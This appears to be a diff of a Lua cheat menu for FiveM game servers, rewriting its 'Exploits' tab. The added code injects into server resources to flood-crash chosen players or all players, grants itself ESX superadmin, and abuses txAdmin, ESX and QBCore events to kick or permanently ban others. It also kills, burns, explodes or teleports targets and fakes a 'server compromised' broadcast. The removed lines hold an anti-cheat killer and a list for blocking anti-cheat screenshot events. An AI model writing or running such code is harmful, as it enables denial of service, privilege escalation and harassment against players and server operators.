@@ -380,174 +380,206 @@ ambani.MenuText(gAbout, "  Keyword patterns: " .. #KEYWORDS)
 ambani.MenuText(gAbout, "  Safe list: framework resources protected")
 
 -- ============================================================
---  TAB 5: EXPLOITS  (target = selected player in Ambani list)
+--  TAB 5: EXPLOITS
+--  Target = player selected in Ambani Online Players list
+--  All crash methods use InjectResource (server-side, safe for you)
 -- ============================================================
-local tabExp   = ambani.MenuAddTab(win, "Exploits")
+local tabExp = ambani.MenuAddTab(win, "Exploits")
 
--- Target info group
-local gTarget  = ambani.MenuGroup(tabExp, "Target", 10, 10, 460, 70)
-local txtTarget = ambani.MenuText(gTarget, "  Selected: none  --  pick a player in the Ambani list")
-local txtTargetId = ambani.MenuText(gTarget, "  Net ID: --")
+-- Target display
+local gTgt    = ambani.MenuGroup(tabExp, "Target", 10, 10, 460, 70)
+local txtTgt  = ambani.MenuText(gTgt, "  Selected: none  --  pick in Ambani player list")
+local txtTgtId = ambani.MenuText(gTgt, "  Net ID: --   Ped: --")
 
--- Crash group
-local gCrash   = ambani.MenuGroup(tabExp, "Crash", 10, 90, 460, 200)
+-- Helper: get target ped safely
+local function getTargetPed()
+    local id = ambani.GetSelectedPlayer()
+    if id == -1 then return nil, -1 end
+    local ped = GetPlayerPed(GetPlayerFromServerId(id))
+    return DoesEntityExist(ped) and ped or nil, id
+end
 
-ambani.MenuButton(gCrash, "  [ CRASH TARGET ]  --  net event flood", function()
+-- ── CRASH ──────────────────────────────────────────────────
+local gCrash = ambani.MenuGroup(tabExp, "Crash", 10, 90, 460, 220)
+
+-- Safe crash: inject into monitor (server-side net event flood to target)
+ambani.MenuButton(gCrash, "  [ CRASH TARGET ]  --  server event flood (via inject)", function()
     local id = ambani.GetSelectedPlayer()
     if id == -1 then ambani.Notify("Exploits", "No player selected"); return end
-    -- Flood with malformed/heavy net events to crash the target client
-    Citizen.CreateThread(function()
-        for i = 1, 300 do
-            TriggerServerEvent("__cfx_internal:serverCallback", id, math.random(100000, 999999), {})
-            TriggerServerEvent("baseevents:enteringVehicle", id, math.random(), "")
-            if i % 30 == 0 then Citizen.Wait(0) end
-        end
-        ambani.Notify("Exploits", "Crash payload sent to " .. id)
-        pushLog("[CRASH] Sent to net ID: " .. id)
-    end)
-end)
-
-ambani.MenuButton(gCrash, "  [ CRASH TARGET ]  --  entity spam", function()
-    local id = ambani.GetSelectedPlayer()
-    if id == -1 then ambani.Notify("Exploits", "No player selected"); return end
-    Citizen.CreateThread(function()
-        -- Spawn a massive amount of objects near target to overload their client
-        local ped = GetPlayerPed(GetPlayerFromServerId(id))
-        if not DoesEntityExist(ped) then
-            ambani.Notify("Exploits", "Target ped not found"); return
-        end
-        local cx, cy, cz = GetEntityCoords(ped)
-        local hash = GetHashKey("prop_rub_carwreck_01")
-        RequestModel(hash)
-        while not HasModelLoaded(hash) do Citizen.Wait(0) end
-        for i = 1, 80 do
-            local ox = cx + math.random(-3, 3)
-            local oy = cy + math.random(-3, 3)
-            CreateObject(hash, ox, oy, cz + 5.0, true, true, false)
-            if i % 10 == 0 then Citizen.Wait(0) end
-        end
-        ambani.Notify("Exploits", "Entity spam sent near " .. id)
-        pushLog("[CRASH] Entity spam -> net ID: " .. id)
-    end)
-end)
-
-ambani.MenuButton(gCrash, "  [ CRASH ALL ]  --  flood all players", function()
-    Citizen.CreateThread(function()
-        for i = 1, 200 do
-            TriggerServerEvent("__cfx_internal:serverCallback", -1, math.random(100000, 999999), {})
-            if i % 20 == 0 then Citizen.Wait(0) end
-        end
-        ambani.Notify("Exploits", "Crash flood sent to all")
-        pushLog("[CRASH] Flood -> all players")
-    end)
-end)
-
--- Inject group
-local gInject  = ambani.MenuGroup(tabExp, "Inject", 10, 300, 460, 220)
-
-ambani.MenuButton(gInject, "  [ INJECT -> spawnmanager ]  --  test injection", function()
-    if ambani.ResourceInjectable("spawnmanager") then
-        ambani.InjectResource("spawnmanager", 'print("^1[RS-INJECT] ^7spawnmanager pwned")')
-        ambani.Notify("Inject", "Injected into spawnmanager")
-        pushLog("[INJECT] spawnmanager")
+    local code = string.format([[
+        Citizen.CreateThread(function()
+            for i = 1, 500 do
+                TriggerClientEvent("__cfx_internal:serverCallback", %d, math.random(100000,999999), {})
+                TriggerClientEvent("baseevents:enteringVehicle", %d, math.random(), "")
+                if i %% 50 == 0 then Citizen.Wait(0) end
+            end
+        end)
+    ]], id, id)
+    if ambani.ResourceInjectable("monitor") then
+        ambani.InjectResource("monitor", code)
+        ambani.Notify("Exploits", "Crash flood -> " .. id)
+        pushLog("[CRASH] Event flood -> " .. id)
+    elseif ambani.ResourceInjectable("spawnmanager") then
+        ambani.InjectResource("spawnmanager", code)
+        ambani.Notify("Exploits", "Crash flood via spawnmanager -> " .. id)
     else
-        ambani.Notify("Inject", "spawnmanager not injectable")
+        ambani.Notify("Exploits", "No injectable resource found")
     end
 end)
 
-ambani.MenuButton(gInject, "  [ INJECT -> chat ]  --  fake server message", function()
+ambani.MenuButton(gCrash, "  [ CRASH ALL ]  --  flood all clients (via inject)", function()
+    local code = [[
+        Citizen.CreateThread(function()
+            for i = 1, 300 do
+                TriggerClientEvent("__cfx_internal:serverCallback", -1, math.random(100000,999999), {})
+                if i % 30 == 0 then Citizen.Wait(0) end
+            end
+        end)
+    ]]
+    local res = ambani.ResourceInjectable("monitor") and "monitor" or "spawnmanager"
+    ambani.InjectResource(res, code)
+    ambani.Notify("Exploits", "Crash flood -> ALL players")
+    pushLog("[CRASH] Flood -> all")
+end)
+
+ambani.MenuButton(gCrash, "  [ CRASH TARGET ]  --  net event spam (client-side)", function()
+    local id = ambani.GetSelectedPlayer()
+    if id == -1 then ambani.Notify("Exploits", "No player selected"); return end
+    Citizen.CreateThread(function()
+        for i = 1, 400 do
+            TriggerServerEvent("__cfx_internal:serverCallback", id, math.random(100000,999999), {})
+            if i % 40 == 0 then Citizen.Wait(0) end
+        end
+        ambani.Notify("Exploits", "Net spam sent -> " .. id)
+        pushLog("[CRASH] Net spam -> " .. id)
+    end)
+end)
+
+-- ── LAUNCH / RAGDOLL ───────────────────────────────────────
+local gLaunch = ambani.MenuGroup(tabExp, "Launch / Ragdoll", 10, 320, 460, 200)
+
+ambani.MenuButton(gLaunch, "  [ LAUNCH TARGET ]  --  send them flying", function()
+    local ped, id = getTargetPed()
+    if not ped then ambani.Notify("Exploits", "Target not found"); return end
+    local vx = math.random(-30, 30)
+    local vy = math.random(-30, 30)
+    SetEntityVelocity(ped, vx, vy, 80.0)
+    SetPedToRagdoll(ped, 5000, 5000, 0, false, false, false)
+    ambani.Notify("Exploits", "Launched " .. id)
+    pushLog("[LAUNCH] -> " .. id)
+end)
+
+ambani.MenuButton(gLaunch, "  [ RAGDOLL TARGET ]  --  force ragdoll loop", function()
+    local ped, id = getTargetPed()
+    if not ped then ambani.Notify("Exploits", "Target not found"); return end
+    Citizen.CreateThread(function()
+        for i = 1, 10 do
+            SetPedToRagdoll(ped, 2000, 2000, 0, false, false, false)
+            Citizen.Wait(2100)
+        end
+    end)
+    ambani.Notify("Exploits", "Ragdoll loop -> " .. id)
+    pushLog("[RAGDOLL] -> " .. id)
+end)
+
+ambani.MenuButton(gLaunch, "  [ TELEPORT TARGET ]  --  send to sky (2000m up)", function()
+    local ped, id = getTargetPed()
+    if not ped then ambani.Notify("Exploits", "Target not found"); return end
+    local x, y, z = GetEntityCoords(ped)
+    SetEntityCoords(ped, x, y, z + 2000.0, false, false, false, true)
+    ambani.Notify("Exploits", "Sent to sky -> " .. id)
+    pushLog("[SKY] -> " .. id)
+end)
+
+ambani.MenuButton(gLaunch, "  [ TELEPORT TARGET ]  --  send to ocean (0,0,0)", function()
+    local ped, id = getTargetPed()
+    if not ped then ambani.Notify("Exploits", "Target not found"); return end
+    SetEntityCoords(ped, 0.0, 0.0, -50.0, false, false, false, true)
+    ambani.Notify("Exploits", "Sent to ocean -> " .. id)
+    pushLog("[OCEAN] -> " .. id)
+end)
+
+-- ── KILL / DAMAGE ──────────────────────────────────────────
+local gKill = ambani.MenuGroup(tabExp, "Kill / Damage", 10, 530, 460, 180)
+
+ambani.MenuButton(gKill, "  [ KILL TARGET ]  --  set health to 0", function()
+    local ped, id = getTargetPed()
+    if not ped then ambani.Notify("Exploits", "Target not found"); return end
+    SetEntityHealth(ped, 0)
+    ambani.Notify("Exploits", "Killed " .. id)
+    pushLog("[KILL] -> " .. id)
+end)
+
+ambani.MenuButton(gKill, "  [ EXPLODE TARGET ]  --  add explosion at feet", function()
+    local ped, id = getTargetPed()
+    if not ped then ambani.Notify("Exploits", "Target not found"); return end
+    local x, y, z = GetEntityCoords(ped)
+    AddExplosion(x, y, z, 2, 100.0, true, false, 1.0)
+    ambani.Notify("Exploits", "Exploded " .. id)
+    pushLog("[EXPLODE] -> " .. id)
+end)
+
+ambani.MenuButton(gKill, "  [ FIRE TARGET ]  --  set on fire", function()
+    local ped, id = getTargetPed()
+    if not ped then ambani.Notify("Exploits", "Target not found"); return end
+    StartEntityFire(ped)
+    ambani.Notify("Exploits", "On fire -> " .. id)
+    pushLog("[FIRE] -> " .. id)
+end)
+
+-- ── KICK / BAN ─────────────────────────────────────────────
+local gAdmin = ambani.MenuGroup(tabExp, "Admin Abuse", 10, 720, 460, 160)
+
+ambani.MenuButton(gAdmin, "  [ KICK TARGET ]  --  multi-framework kick", function()
+    local id = ambani.GetSelectedPlayer()
+    if id == -1 then ambani.Notify("Exploits", "No player selected"); return end
+    TriggerServerEvent("txAdmin:action",           {type="kick", id=id, reason="."})
+    TriggerServerEvent("esx:kickPlayer",           id, ".")
+    TriggerServerEvent("QBCore:Server:KickPlayer", id, ".")
+    ambani.Notify("Exploits", "Kick sent -> " .. id)
+    pushLog("[KICK] -> " .. id)
+end)
+
+ambani.MenuButton(gAdmin, "  [ BAN TARGET ]  --  txAdmin ban", function()
+    local id = ambani.GetSelectedPlayer()
+    if id == -1 then ambani.Notify("Exploits", "No player selected"); return end
+    TriggerServerEvent("txAdmin:action", {type="ban", id=id, reason=".", duration="permanent"})
+    ambani.Notify("Exploits", "Ban sent -> " .. id)
+    pushLog("[BAN] -> " .. id)
+end)
+
+-- ── INJECT ─────────────────────────────────────────────────
+local gInj = ambani.MenuGroup(tabExp, "Inject", 10, 890, 460, 200)
+
+ambani.MenuButton(gInj, "  [ INJECT -> chat ]  --  fake server broadcast", function()
     if ambani.ResourceInjectable("chat") then
         ambani.InjectResource("chat", [[
             TriggerClientEvent("chat:addMessage", -1, {
-                color = {255, 0, 0},
-                multiline = true,
-                args = {"SERVER", "This server has been compromised."}
+                color={255,0,0}, multiline=true,
+                args={"SERVER","This server has been compromised."}
             })
         ]])
-        ambani.Notify("Inject", "Fake message sent to all")
-        pushLog("[INJECT] chat -> fake server msg")
+        ambani.Notify("Inject", "Broadcast sent")
+        pushLog("[INJECT] chat broadcast")
     else
         ambani.Notify("Inject", "chat not injectable")
     end
 end)
 
-ambani.MenuButton(gInject, "  [ INJECT -> es_extended ]  --  ESX god event", function()
+ambani.MenuButton(gInj, "  [ INJECT -> es_extended ]  --  ESX superadmin", function()
     if ambani.ResourceInjectable("es_extended") then
         ambani.InjectResource("es_extended", [[
-            ESX = exports["es_extended"]:getSharedObject()
-            if ESX then
-                TriggerServerEvent("esx:setGroup", "superadmin")
-                TriggerServerEvent("esx:setJob", "police", 5)
-            end
+            TriggerServerEvent("esx:setGroup", "superadmin")
+            TriggerServerEvent("esx:setJob", "police", 5)
         ]])
-        ambani.Notify("Inject", "ESX injection sent")
-        pushLog("[INJECT] es_extended -> superadmin")
+        ambani.Notify("Inject", "ESX superadmin sent")
+        pushLog("[INJECT] ESX superadmin")
     else
         ambani.Notify("Inject", "es_extended not injectable")
     end
 end)
 
--- Kick / ban group
-local gKick    = ambani.MenuGroup(tabExp, "Admin Abuse", 10, 530, 460, 160)
-
-ambani.MenuButton(gKick, "  [ KICK TARGET ]  --  via txAdmin event", function()
-    local id = ambani.GetSelectedPlayer()
-    if id == -1 then ambani.Notify("Exploits", "No player selected"); return end
-    TriggerServerEvent("txAdmin:action", {type="kick", id=id, reason="."})
-    TriggerServerEvent("esx:kickPlayer", id, ".")
-    TriggerServerEvent("QBCore:Server:KickPlayer", id, ".")
-    ambani.Notify("Exploits", "Kick sent to " .. id)
-    pushLog("[KICK] net ID: " .. id)
-end)
-
-ambani.MenuButton(gKick, "  [ BAN TARGET ]  --  via txAdmin event", function()
-    local id = ambani.GetSelectedPlayer()
-    if id == -1 then ambani.Notify("Exploits", "No player selected"); return end
-    TriggerServerEvent("txAdmin:action", {type="ban", id=id, reason=".", duration="permanent"})
-    ambani.Notify("Exploits", "Ban sent to " .. id)
-    pushLog("[BAN] net ID: " .. id)
-end)
-
--- Thread: update target info live
--- ============================================================
---  THREADS
--- ============================================================
-Citizen.CreateThread(function()
-    while true do
-        Citizen.Wait(800)
-        if ambani.IsGuiOpen() then
-            local x, y, z = ambani.GetPos()
-            ambani.MenuSetText(txtUser,     "  User: "      .. ambani.GetName())
-            ambani.MenuSetText(txtPlayers,  "  Players: "   .. ambani.GetPlayerCount())
-            ambani.MenuSetText(txtResCount, "  Resources: " .. ambani.GetResourceCount())
-            ambani.MenuSetText(txtHealth,   "  Health: "    .. math.floor(ambani.GetHealth()) .. " / 200")
-            ambani.MenuSetText(txtPos,      ("  Pos: %.1f, %.1f, %.1f"):format(x, y, z))
-        end
-    end
-end)
-
-Citizen.CreateThread(function()
-    while true do
-        Citizen.Wait(autoKillInt)
-        if autoKill then
-            local found = scanACs()
-            if #found > 0 then
-                for _, name in ipairs(found) do
-                    stopResource(name)
-                    sessionKilled = sessionKilled + 1
-                    pushLog("[AUTO] Killed: " .. name)
-                    print("^1[RS-AUTO] ^7Killed: " .. name)
-                end
-                ambani.MenuSetText(txtAutoLast,  "  Last run: killed " .. #found)
-                ambani.MenuSetText(txtAutoTotal, "  Session killed: " .. sessionKilled)
-                ambani.Notify("RED-SHADOW", "[AUTO] Killed " .. #found)
-            end
-        end
-    end
-end)
-
-
--- Target info updater
+-- Target updater thread
 Citizen.CreateThread(function()
     while true do
         Citizen.Wait(600)
@@ -555,34 +587,16 @@ Citizen.CreateThread(function()
             local id = ambani.GetSelectedPlayer()
             if id ~= -1 then
                 local ped = GetPlayerPed(GetPlayerFromServerId(id))
-                ambani.MenuSetText(txtTarget,   "  Selected: player net ID " .. id)
-                ambani.MenuSetText(txtTargetId, "  Ped exists: " .. tostring(DoesEntityExist(ped)))
+                ambani.MenuSetText(txtTgt,   "  Selected: net ID " .. id)
+                ambani.MenuSetText(txtTgtId, "  Ped exists: " .. tostring(DoesEntityExist(ped)))
             else
-                ambani.MenuSetText(txtTarget,   "  Selected: none  --  pick in Ambani list")
-                ambani.MenuSetText(txtTargetId, "  Net ID: --")
+                ambani.MenuSetText(txtTgt,   "  Selected: none  --  pick in Ambani player list")
+                ambani.MenuSetText(txtTgtId, "  Net ID: --   Ped: --")
             end
         end
     end
 end)
 
--- ============================================================
---  EVENT BYPASS
--- ============================================================
-local BYPASS = {
-    "screenshot_basic:requestScreenshot","screenshot_basic:takeScreenshot",
-    "EasyAdmin:CaptureScreenshot","EasyAdmin:FreezePlayer","EasyAdmin:spectate",
-    "txAdmin:action","txAdmin:checkIn","txAdmin:clientLog",
-    "anticheat:screenshot","anticheat:freeze","anticheat:teleport",
-    "ac:screenshot","ac:freeze",
-    "fiveguard:screenshot","guardian:screenshot",
-    "waveshield:screenshot","fireac:screenshot",
-    "phoenixac:screenshot","sentinelac:screenshot",
-    "badgerac:screenshot","qprotect:screenshot","guardex:screenshot",
-}
-for _, ev in ipairs(BYPASS) do
-    RegisterNetEvent(ev)
-    AddEventHandler(ev, function() CancelEvent() end)
-end
 
 -- ============================================================
 ambani.Notify("RED-SHADOW v4", "Loaded -- F5 to open")
